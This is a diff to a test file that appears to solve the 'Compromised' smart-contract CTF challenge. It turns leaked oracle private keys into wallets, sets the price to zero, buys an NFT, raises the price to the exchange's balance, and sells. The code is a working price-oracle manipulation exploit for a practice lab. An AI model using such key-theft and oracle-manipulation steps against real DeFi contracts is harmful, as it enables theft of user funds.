@@ -67,23 +67,18 @@ describe('Compromised challenge', function () {
             "0xc678ef1aa456da65c6fc5861d44892cdfac0c6c8c2560bf0c9fbcdae2f4735a9",
             "0x208242c40acdfa9ed889e685c23547acbed9befc60371e9875fbcd736340bb48"
         ]
-
-
-        //test
-        const [owner, addr1] = await ethers.getSigners();
-        console.log(owner.getAddress());
-        console.log(addr1.getAddress());
-
-        // end test
-        console.log("@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@ WOWOWOWOWOWO");
-		
+        let wallets = new Array();
         for (let i = 0; i < passwords.length; i++) {
-			await this.oracle.connect(passwords[i]).postPrice(tokenId, 0);
+            wallets.push(new ethers.Wallet(passwords[i]));
+        }
+
+        for (let i = 0; i < wallets.length; i++) {
+			await this.oracle.connect(wallets[i]).postPrice(tokenId, 0);
         }
 		await this.exchange.connect(attacker.address).buyOne();
 		let exchangeBalance = this.exchange.balance;
-		for (let i = 0; i < passwords.length; i++) {
-			await this.oracle.connect(passwords[i]).postPrice(tokenId, exchangeBalance);
+		for (let i = 0; i < wallets.length; i++) {
+			await this.oracle.connect(wallets[i]).postPrice(tokenId, exchangeBalance);
         }
 		
 		await this.exchange.connect(attacker.address).sellOne();
